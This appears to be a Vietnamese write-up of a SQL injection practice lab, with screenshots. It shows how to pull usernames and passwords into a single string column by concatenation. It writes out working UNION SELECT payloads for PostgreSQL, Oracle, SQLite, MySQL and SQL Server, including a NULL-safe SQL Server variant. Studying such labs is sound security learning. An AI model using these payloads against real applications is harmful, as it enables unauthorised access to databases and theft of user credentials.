![image](https://github.com/user-attachments/assets/3ba2a7d4-9375-4f09-bfcd-5c036adf61c5)

![image](https://github.com/user-attachments/assets/dd98f6e9-8bca-4a65-b5a0-316fc81bc0eb)

![image](https://github.com/user-attachments/assets/16725c41-dd2f-4fdb-973e-ffab02fa06e3)

Ta xác định được trong câu query có 2 cột.

![image](https://github.com/user-attachments/assets/3c4601e0-fdcd-4b74-84b8-3b49c1ef7bfd)

Tại sao nó lại lỗi :")), có lẽ nào chỉ có 1 cột là string không ?

![image](https://github.com/user-attachments/assets/db5f97ea-89d4-4d62-b68f-22b0d48ebd7f)

Đúng thật.

Vậy giờ ta sẽ có 2 cách, 1 cách là select 2 lần như này, 1 lần username, 1 lần password.

Cách thứ 2 sẽ là dùng toán tử concat operator || để nối giá trị của hai cột username và password trong table users lại với nhau

Vì chỉ có một cột hiển thị, ta cần nối username và password lại thành một chuỗi bằng concat operator (||):

**PostgreSQL, SQLite, Oracle (Dùng || để nối chuỗi)**

```
' UNION SELECT username || ' - ' || password FROM users--
```

**Với MySQL (vì || trong MySQL là toán tử logic, không phải concat)**

```
' UNION SELECT CONCAT(username, ' - ', password) FROM users--
```

**' UNION SELECT username + ' - ' + password FROM users--**

**_Nếu gặp lỗi do NULL_**

Trong SQL Server, nếu một trong hai giá trị username hoặc password là NULL, phép nối chuỗi + có thể trả về NULL toàn bộ chuỗi. Để tránh điều này, dùng ISNULL():

ISNULL(username, 'N/A'): Nếu username bị NULL, thay bằng 'N/A'.

ISNULL(password, 'N/A'): Nếu password bị NULL, thay bằng 'N/A'.

Điều này đảm bảo câu lệnh không bị lỗi NULL và hiển thị đầy đủ kết quả.

```
' UNION SELECT ISNULL(username, 'N/A') + ' - ' + ISNULL(password, 'N/A') FROM users--
```

username || ' - ' || password: Nối username và password bằng dấu - để dễ đọc.

Nếu hệ thống chạy MySQL, thay || bằng CONCAT(username, ' - ', password).

![image](https://github.com/user-attachments/assets/c252b990-1a3c-450e-b90d-21370aab75e8)

Vậy là thành công.
